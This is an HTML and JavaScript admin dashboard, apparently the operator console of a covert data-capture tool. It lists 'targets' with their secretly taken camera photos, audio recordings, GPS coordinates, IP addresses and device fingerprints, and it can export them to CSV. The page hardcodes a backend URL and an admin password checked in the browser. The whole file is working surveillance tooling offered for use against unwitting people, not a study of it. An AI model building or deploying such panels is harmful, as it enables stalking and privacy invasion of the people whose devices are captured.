<!DOCTYPE html>
<html>
<head>
    <title>🔐 ADMIN</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body { font-family:'Courier New',monospace; background:#0a0a0a; color:#00ff41; padding:20px; }
        .container { max-width:1200px; margin:auto; }
        .login-box { background:#111; border:2px solid #00ff41; border-radius:10px; padding:40px; max-width:350px; margin:50px auto; text-align:center; }
        .login-box input { width:100%; padding:12px; margin:10px 0; background:#000; border:1px solid #00ff41; color:#00ff41; font-size:16px; }
        .login-box button { width:100%; padding:12px; background:#00ff41; color:#000; border:none; cursor:pointer; font-weight:bold; font-size:16px; }
        .login-box .error { color:#ff0040; margin-top:10px; }
        .gallery { display:none; }
        header { display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; margin-bottom:20px; border-bottom:1px solid #00ff41; padding-bottom:10px; }
        h2 { color:#00ff41; }
        .stats { color:#aaa; }
        .stats span { color:#00ff41; font-size:24px; }
        .grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(350px,1fr)); gap:20px; }
        .card { background:#111; border:1px solid #00ff41; border-radius:8px; overflow:hidden; transition:0.3s; }
        .card:hover { border-color:#00ff41; box-shadow:0 0 30px rgba(0,255,65,0.05); }
        .card .img-grid { display:grid; grid-template-columns:1fr 1fr; }
        .card .img-grid img { width:100%; height:150px; object-fit:cover; cursor:pointer; }
        .card .info { padding:12px; font-size:12px; }
        .card .info .delete-btn { padding:5px 12px; background:#ff0040; color:white; border:none; cursor:pointer; margin-top:8px; }
        .card .info .highlight { color:#ffaa00; }
        .card .info .device-detail { color:#00ff41; font-size:11px; padding:2px 0; border-bottom:1px solid rgba(0,255,65,0.05); }
        .card .info .device-detail span { color:#6c5ce7; font-weight:bold; }
        .audio-player { margin-top:8px; background:#000; padding:8px; }
        .audio-player audio { width:100%; }
        .loading, .no-data { color:#00ff41; text-align:center; padding:40px; font-size:18px; }
        .header-buttons { display:flex; gap:10px; flex-wrap:wrap; }
        .header-buttons button { padding:8px 16px; background:transparent; border:1px solid #00ff41; color:#00ff41; cursor:pointer; }
        .header-buttons .logout { border-color:#ff0040; color:#ff0040; }
        .lightbox { display:none; position:fixed; top:0; left:0; right:0; bottom:0; background:rgba(0,0,0,0.9); justify-content:center; align-items:center; z-index:9999; }
        .lightbox img { max-width:90%; max-height:85%; border:2px solid #00ff41; }
        .lightbox .close { position:absolute; top:20px; right:40px; color:#00ff41; font-size:40px; cursor:pointer; }
    </style>
</head>
<body>
<div class="container">

<div class="lightbox" id="lightbox" onclick="closeLightbox()">
    <span class="close" onclick="event.stopPropagation(); closeLightbox()">✕</span>
    <img id="lightboxImg" src="" />
</div>

<div class="login-box" id="loginBox">
    <h2>🔐 ADMIN</h2>
    <input type="password" id="passwordInput" placeholder="PASSWORD" />
    <button onclick="login()">UNLOCK</button>
    <div class="error" id="loginError"></div>
</div>

<div class="gallery" id="gallery">
    <header>
        <div>
            <h2>📊 DATABASE</h2>
            <div class="stats">TARGETS: <span id="total">0</span></div>
        </div>
        <div class="header-buttons">
            <button onclick="exportCSV()">📊 CSV</button>
            <button class="logout" onclick="logout()">🚪 EXIT</button>
            <button onclick="loadData()">🔄 REFRESH</button>
        </div>
    </header>
    <div class="grid" id="grid"></div>
</div>

<script>
const BACKEND_URL = 'https://auto-capture-pro.onrender.com';
const PASSWORD = 'admin123#@!';

function login() {
    const pwd = document.getElementById('passwordInput').value;
    const error = document.getElementById('loginError');
    if (pwd === PASSWORD) {
        document.getElementById('loginBox').style.display = 'none';
        document.getElementById('gallery').style.display = 'block';
        error.textContent = '';
        loadData();
    } else {
        error.textContent = '⛔ ACCESS DENIED!';
        document.getElementById('passwordInput').value = '';
    }
}

function logout() {
    document.getElementById('loginBox').style.display = 'block';
    document.getElementById('gallery').style.display = 'none';
    document.getElementById('passwordInput').value = '';
    document.getElementById('loginError').textContent = '';
}

function exportCSV() {
    window.open(BACKEND_URL + '/api/export-csv', '_blank');
}

function openLightbox(src) {
    document.getElementById('lightboxImg').src = src;
    document.getElementById('lightbox').style.display = 'flex';
}

function closeLightbox() {
    document.getElementById('lightbox').style.display = 'none';
}

async function loadData() {
    const grid = document.getElementById('grid');
    const total = document.getElementById('total');
    grid.innerHTML = '<div class="loading">⏳ LOADING...</div>';
    
    try {
        const res = await fetch(BACKEND_URL + '/api/admin/get-data', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ password: PASSWORD })
        });
        
        if (!res.ok) {
            const text = await res.text();
            console.error('Server Error:', text);
            throw new Error('HTTP ' + res.status);
        }
        
        const data = await res.json();
        console.log('Data received:', data);
        
        if (!data.success) {
            grid.innerHTML = '<div class="no-data">⛔ ' + data.message + '</div>';
            return;
        }
        
        total.textContent = data.count || 0;
        if (!data.data || data.data.length === 0) {
            grid.innerHTML = '<div class="no-data">📭 NO DATA</div>';
            return;
        }
        
        grid.innerHTML = '';
        
        data.data.forEach(item => {
            const card = document.createElement('div');
            card.className = 'card';
            
            // Device Details
            const deviceInfo = item.fullDeviceInfo || item.deviceDetails || {};
            
            // Photo
            const userPhotoSrc = item.userPhoto || item.cameraImage || '#';
            
            // Audio
            let audioHTML = '';
            if (item.audioData && item.audioData !== 'null') {
                audioHTML = `<div class="audio-player"><audio controls><source src="${item.audioData}" type="audio/webm"></audio></div>`;
            }
            
            card.innerHTML = `
                <div class="img-grid">
                    <img src="${userPhotoSrc}" onclick="openLightbox('${userPhotoSrc}')" onerror="this.src='data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 width=%22100%22 height=%22100%22><rect fill=%22%23000%22 width=%22100%22 height=%22100%22/><text x=%2250%22 y=%2250%22 text-anchor=%22middle%22 fill=%22%2300ff41%22 font-size=%2220%22>📸</text></svg>'" />
                    <div style="background:rgba(0,0,0,0.5);padding:10px;display:flex;flex-direction:column;justify-content:center;color:#00ff41;font-size:11px;">
                        <div style="color:#ffaa00;font-size:12px;margin-bottom:5px;">📱 DEVICE INFO</div>
                        <div>📱 ${deviceInfo.deviceName || 'Unknown'}</div>
                        <div>📱 ${deviceInfo.deviceModel || 'Unknown'}</div>
                        <div>🏭 ${deviceInfo.manufacturer || 'Unknown'}</div>
                        <div>📲 ${deviceInfo.os || 'Unknown'} ${deviceInfo.osVersion || ''}</div>
                    </div>
                </div>
                <div class="info">
                    <div style="display:grid;grid-template-columns:1fr 1fr;gap:4px;font-size:11px;">
                        <div class="device-detail">📍 <span>${item.location?.lat?.toFixed(4) || 0}</span></div>
                        <div class="device-detail">📍 <span>${item.location?.lng?.toFixed(4) || 0}</span></div>
                        <div class="device-detail">🎯 <span>${item.location?.accuracy || 'Unknown'}m</span></div>
                        <div class="device-detail">📡 <span>${item.ipAddress || 'Unknown'}</span></div>
                        <div class="device-detail">📱 <span>${deviceInfo.deviceName || 'Unknown'}</span></div>
                        <div class="device-detail">📱 <span>${deviceInfo.deviceModel || 'Unknown'}</span></div>
                        <div class="device-detail">🏭 <span>${deviceInfo.manufacturer || 'Unknown'}</span></div>
                        <div class="device-detail">📲 <span>${deviceInfo.os || 'Unknown'} ${deviceInfo.osVersion || ''}</span></div>
                        <div class="device-detail">🔋 <span>${deviceInfo.battery?.level || 'Unknown'}</span></div>
                        <div class="device-detail">📶 <span>${deviceInfo.connection?.type || 'Unknown'}</span></div>
                        <div class="device-detail">🖥️ <span>${deviceInfo.screen?.width || 'Unknown'}x${deviceInfo.screen?.height || 'Unknown'}</span></div>
                        <div class="device-detail">🧠 <span>${deviceInfo.memory || 'Unknown'}GB</span></div>
                        <div class="device-detail">⚡ <span>${deviceInfo.cores || 'Unknown'}</span></div>
                        <div class="device-detail">🌐 <span>${deviceInfo.language || 'Unknown'}</span></div>
                        <div class="device-detail">🕒 <span>${deviceInfo.timezone || 'Unknown'}</span></div>
                    </div>
                    <div style="margin-top:8px;font-size:11px;color:rgba(0,255,65,0.4);">
                        🕐 ${new Date(item.timestamp).toLocaleString()}
                    </div>
                    ${audioHTML}
                    <button class="delete-btn" onclick="deleteData('${item._id}')">🗑️ DELETE</button>
                </div>
            `;
            grid.appendChild(card);
        });
        
    } catch(err) {
        console.error('Error:', err);
        grid.innerHTML = '<div class="no-data">❌ ERROR: ' + err.message + '</div>';
    }
}

async function deleteData(id) {
    if (!confirm('Delete?')) return;
    try {
        const res = await fetch(BACKEND_URL + '/api/admin/delete', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ password: PASSWORD, id })
        });
        const data = await res.json();
        if (data.success) loadData();
        else alert('Error: ' + data.message);
    } catch(err) {
        alert('Error: ' + err.message);
    }
}

document.getElementById('passwordInput').addEventListener('keypress', e => {
    if (e.key === 'Enter') login();
});

console.log('🔐 ADMIN LOADED, BACKEND:', BACKEND_URL);
</script>
</body>
</html>
